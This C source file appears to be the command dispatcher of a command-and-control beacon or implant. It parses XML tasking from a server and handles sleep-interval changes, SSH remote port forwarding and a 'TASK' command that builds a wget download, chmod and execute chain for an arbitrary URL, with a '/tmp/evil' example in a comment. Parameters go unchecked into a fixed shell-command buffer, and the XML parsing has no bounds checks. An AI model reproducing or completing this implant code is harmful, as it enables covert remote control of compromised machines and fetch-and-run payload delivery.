#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <errno.h>
#include <sys/types.h>

#include "command.h"
#include "beacon.h"
#include "colors.h"
#include "ssh.h"

#define MAX_ATTR_LEN 128

static int validate_param(const char *cmd, const char *param)
{
	return 1;
}

#define SUCC 1
#define FAIL (-1)

static int exec_command(char *cmd, char *param)
{
	int ret = 0;

	if (strcmp(cmd, "SLEP") == 0) {
		/* Update timeout value */
		// if (is_valid_interval(param))
		timeout = (int)strtol(param, NULL, 10);
		printf(GREEN("[*] Timeout set to %d seconds\n"), timeout);
		ret = SUCC;
	} else if (strcmp(cmd, "OTCP") == 0) {
		/* remote port forwarding: L22C900 */
		// if (is_valid_port_spec(param))
		int lport, rport;
		sscanf(param, "L%dC%d", &lport, &rport);
		printf("[*] Calling do_remote_tunnel(%d, %d)\n", lport, rport);
		ret = remote_forwarding(lport, rport);
		if (ret == SUCC) {
			printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
			       lport);
		} else {
			printf(RED("[*] Failed to open TCP tunnel\n"));
		}
	} else if (strcmp(cmd, "CTCP") == 0) {
		printf(GREEN("[CTCP] TCP tunnel closed\n"));
		return FAIL;
	} else if (strcmp(cmd, "OSSH") == 0) {
		printf(GREEN("[OSSH] Opened SSH tunnel on port X\n"));
		return FAIL;
	} else if (strcmp(cmd, "CSSH") == 0) {
		printf(GREEN("[CSSH] SSH tunnel closed\n"));
		return FAIL;
	} else if (strcmp(cmd, "ODYN") == 0) {
		printf(GREEN("[ODYN] Opened dynamic on port X\n"));
		return FAIL;
	} else if (strcmp(cmd, "CDYN") == 0) {
		printf(GREEN("[CDYN] Dynamic closed\n"));
		return FAIL;
	} else if (strcmp(cmd, "TASK") == 0) {
		// if (is_valid_url(param))
		char *cmd_str = malloc(256);
		if (cmd_str == NULL)
			return FAIL;
		char *filename = basename(param);
		// wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
		sprintf(cmd_str,
			"wget -O /tmp/%s %s && chmod u+x /tmp/%s && /tmp/%s",
			filename, param, filename, filename);
		printf(GREEN("[TASK] %s\n"), cmd_str);
		// system(cmd_str);
		free(cmd_str);
		return FAIL;
	}

	return ret;
}

static char *xml_get_attribute(const char *xml, const char *attr)
{
	char *name_start = strstr(xml, attr);
	size_t name_len = strlen(attr);
	char *value_start = name_start + name_len + 2;	// for '="'
	size_t value_len = 0;
	char *curr;
	for (curr = value_start; *curr != '"'; curr++)
		value_len++;

	char *value = malloc(value_len + 1);	// '\0'
	if (value == NULL) {
		printf("malloc\n");
		return NULL;
	}

	memcpy(value, value_start, value_len);
	value[value_len] = '\0';
	return value;
}

/* returns -1 if a system error occurred (malloc)
   return 0 if the tag wasn't found
   returns 1 if the tag was found
   */
static char *xml_parse_command(const char *xml, struct command *cmd)
{
	char *type;
	char *param;
	int id;

	char *pos = strstr(xml, "command id=\"");
	if (!pos)
		return NULL;

	type = xml_get_attribute(pos, "type");
	param = xml_get_attribute(pos, "param");
	char *id_str = xml_get_attribute(pos, "id");

	/* Should do some sanity checks... */
	cmd->id = (int)strtol(id_str, NULL, 10);
	free(id_str);
	cmd->type = type;
	cmd->param = param;

	/* Return next index to enusure the next call
	   looks past the current command */
	return (pos + 1);
}

static int xml_parse_response(char *response, struct command **cmds)
{
	*cmds = NULL;
	int cmd_num = 0;

	if (response) {
		char *cmds_section = strstr(response, "commands");
		if (!cmds_section) {
			printf("[*] XML does not have a commands section\n");
			return cmd_num;
		}
		printf("[*] Commands section found\n");

		char *pos = cmds_section;
		struct command *last;

		// replace with recursive function?
		while (1) {
			struct command *cmd = calloc(1, sizeof(struct command));

			printf("[*] Fetching command...\n");
			if ((pos = xml_parse_command(pos, cmd)) == NULL) {
				printf("[*] No command found\n");
				break;
			}

			printf("[*] Found command [%d] %s : %s\n",
			       cmd->id, cmd->type, cmd->param);

			if (*cmds == NULL) {
				*cmds = cmd;
			} else {
				last->next = cmd;
			}
			last = cmd;
			cmd_num++;
		}
	}

	return cmd_num;
}

void parse_and_exec(char *beacon_response)
{
	if (!beacon_response)
		return;

	struct command *cmds;
	printf("[*] Parsing beacon response...\n");
	int cmd_num = xml_parse_response(beacon_response, &cmds);
	if (!cmd_num) {
		printf("[*] No commands found\n");
		return;
	}

	printf("[*] Found %d commands\n", cmd_num);

	int i, ret;
	struct command *curr_cmd = cmds;
	for (i = 0; i < cmd_num; i++) {
		printf("[*] Starting execution of command [%d]\n",
		       curr_cmd->id);
		curr_cmd->ret = exec_command(curr_cmd->type, curr_cmd->param);
		printf("[*] Command [%d] status: %s\n", curr_cmd->id,
		       (curr_cmd->ret == SUCC) ? GREEN("V") : RED("X"));
		curr_cmd = curr_cmd->next;

		// do something with the ret value...
	}

	/* Remember to free all command-related buffers */
	curr_cmd = cmds;
	struct command *next = cmds;
	for (i = 0; i < cmd_num; i++) {
		printf("[*] Freeing memory for command [%d]...\n",
		       curr_cmd->id);
		curr_cmd = next;
		printf("[*] Freeing command type...\n");
		free(curr_cmd->type);
		printf("[*] Freeing command parameter...\n");
		free(curr_cmd->param);
		next = curr_cmd->next;
		printf("[*] Freeing command struct...\n");
		free(curr_cmd);
	}
}
